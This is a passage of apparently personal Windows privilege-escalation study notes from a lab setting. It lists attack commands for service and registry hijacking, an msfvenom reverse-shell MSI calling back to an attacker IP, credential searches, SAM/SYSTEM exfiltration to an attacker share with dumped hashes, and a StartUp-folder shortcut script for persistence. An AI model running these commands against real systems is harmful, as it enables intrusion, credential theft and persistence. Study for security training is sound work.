# Windows

## Summary

* **Services** - Insecure Service Permissions
* **Services** - Unquoted Service Paths
* **Services** - Weak Registry Permissions
* **Services** - Insecure Service Executables
* **Registry -** AutoRuns
* **Registry -** AlwaysInstallElevated
* **Passwords** - Registry
* **Passwords** - Saved Creds
* **Passwords** - Security Account Manager (SAM)
* **Passwords** - Passing the Hash
* Scheduled Tasks
* Insecure GUI Apps
* Startup Apps
* Token Impersonation - Rogue Potato
* Token Impersonation - PrintSpoofer
* Privilege Escalation Scripts



## Tools

* PowerUP
* SharpUP
* Pre-Compiled SharpUP
* WinPEAS
* Seatbelt
* Accesschk.exe (use older version from Tib3rius which allows /accept eula)

## Kernel Exploits

{% hint style="danger" %}
**Kernel exploits are a last resort!!**
{% endhint %}

* Precompiled Kernel exploits: _**github.com/SecWiki/windows-kernel-exploits**_
* Watson
* Windows Exploit Suggester

## Service **Exploits**

```
sc.exe qc <name>
sc query <name>
sc config <name>  <option>= <value>
net start/stop <name>
```

### **Insecure Service Permissions**

_**Useful Permissions**_

* SERVICE\_STOP, SERVICE\_START

#### **Dangerous Permissions**

* **SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS**
  * accesschk.exe /accepteula -uwcqv \<user> \<service>
  * You can see below that the service "daclsvc" has the "_**SERVICE\_CHANGE\_CONFIG**" permission, which means you can change the BINPATH, it also has_ **SERVICE\_START** _and ****_** SERVICE\_STOP**

![](<../../.gitbook/assets/image (20).png>)

* **Changing binpath**
  * `sc config daclsvc binpath = "Path to shell (ex: C:\windows\temp)"`
  * After changing the binpath, check that the config took with "sc qc \<servicename>
  * After you confirm it took, you can start the service with "net start \<servicename>" which should trigger your reverse shell

![](<../../.gitbook/assets/image (21).png>)

### _**Unquoted Service Paths**_&#x20;

{% hint style="warning" %}
### _**As a user, you should be able to restart the system, unlike on Linux where you sometimes need root or sudo**_
{% endhint %}

{% embed url="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" %}
Very good writeup on unquoted service paths
{% endembed %}

### **Weak Registry Permissions**

* Even if we cannot change the service directly, we may be able to modify the registry key the service uses
  * **Checking permissions on a service**
    * **From Powershell**: Get-ACL HKLM:\System\CurrentControlSet\Services\\_\<servicename>_ | Format-List
    * **From AccessChk.exe**: accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\\_\<servicename>_
  * **Changing the registry key (may not be this exact key)**
    * **reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v/ ImagePath /t REG\_EXPAND\_SZ /d \<path to reverse shell> /f**

![](<../../.gitbook/assets/image (22).png>)

### _**Insecure Service Executables** (original service executable modifiable by our user, replace with our reverse shell)_

### **DLL Hijacking **_****_&#x20;

_Believe it or not, services try to load functions/functionality from a library called a DLL. The DLL will be loaded(executed) with the same privs as the service that loaded it. If the DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user._\
__\
_More commonly, though; a DLL may be missing from the system, and our user has write access within that path, however this is a very manual process to find normally._

![Output of WinPEAS.exe DLL section (obviously very vulnerable system)](<../../.gitbook/assets/image (8).png>)

### AutoRuns

{% hint style="warning" %}
On windows 10 (and possibly others), Autoruns may tend to run the command with the user who was last logged in
{% endhint %}

Windows can be configured to run commands at startup with elevated privs, these are configured in the registry. If we're able to write to an AutoRun exe, and able to restart or wait for restart, we might be able to escalate\


![Autorun program found by winPEAS](<../../.gitbook/assets/image (10).png>)

Validate the above output with accesschk to make sure that the output is correct (this may not always be feasible, obviously)

![Validating permissions](<../../.gitbook/assets/image (12).png>)

AlwaysInstallElevated

MSI files are package files used to install applications, they run as the user trying to install them.\
Windows allows for these installers to be run elevated\
If this is the case, we can generate a malicious MSI file which contains a reverse shell.\
2 registry keys **MUST be configured** for this to work:

* The "**AlwaysInstallElevated**" value must be set to 1 for both the local machine and the current user
* HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
* HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

![Showing the registry keys are set to TRUE](<../../.gitbook/assets/image (13).png>)

_**Create the .msi reverse shell package**_

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.ms
```

**Move it to the windows machine and trigger**

```
msiexec /quiet /qn /i <path to reverse shell> (must use full path, not relative)
```

## Passwords

### But where!?

* **Registry**
  * Search for registry keys with values that contain the keyword "password" (you will probably get a lot of results with not a whole lot of good info)
    * **reg query HKLM /f password /t REG\_SZ /s**
    * **reg query HKCU /f password /t REG\_SZ /s**

![](<../../.gitbook/assets/image (14).png>)

### Saved Creds

**cmdkey /list**

_Running saved creds from user shell as admin with their saved cred_\
**runas /savecred /user:admin \<path to reverse shell>**

#### Search for saved creds

* _// Search for files in the current dir with "pass" in the name or ending in ".config"_
* **dir /s \*pass\* == \*.config**
* _// Recursively search for files in current dir that contain word "password" and also end in either .xml, .ini, or .txt_
* **findstr /si password \*.xml \*.ini \*.txt**

**SAM Passwords**

```
#From Windows
copy C:\windows\repair\sam \\<kali IP>\directory
copy C:\windows\repair\system \\<kali IP>\directory

#On Kali
python2 creddump7/pwdump.py SYSTEM SAM

#Example
root@kali:~/Tools# python2 creddump7/pwdump.py /root/boxes/THM/windowsprivesc/SYSTEM /root/boxes/THM/windowsprivesc/SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::

```

**Startup Apps**

**cscript script thing**

```csharp
Check if you can write to StartUp directory:

C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# If so, transfer or create the script below, transfer reverse shell, and run it
# An ADMIN or User must login to trigger the shell, ideally you want an Admin if
# you clearly already have access to transfer stuff to the machine as a user

cscript C:\Privesc\CreateShortcut.vbs

# this is what CreateShortcut.vbs is
# creates a shortcut to reverse.exe in StartUp directory
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save


```

